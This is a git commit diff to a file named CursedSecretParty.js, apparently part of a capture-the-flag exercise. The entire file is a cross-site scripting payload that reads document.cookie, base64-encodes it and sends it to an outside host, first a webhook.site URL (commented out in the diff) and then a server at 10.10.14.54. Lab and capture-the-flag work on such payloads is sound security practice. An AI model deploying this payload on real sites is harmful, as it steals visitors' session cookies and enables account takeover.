6fe785f6fd3e863efbbd23b5aeb6e61981d73e99
Chenliang Wang <67798504+ChenliangEdward@users.noreply.github.com>
2024-11-11 14:58:20 -0500

    Update CursedSecretParty.js

--- CursedSecretParty.js
+++ CursedSecretParty.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/71da84df-86a7-448d-b56a-d855a35605d6?data='+btoa(document.cookie); 
+// x = new Image(); x.src = 'https://webhook.site/71da84df-86a7-448d-b56a-d855a35605d6?data='+btoa(document.cookie); 
+x = new Image(); x.src = 'http://10.10.14.54/hey.php?data='+btoa(document.cookie); 
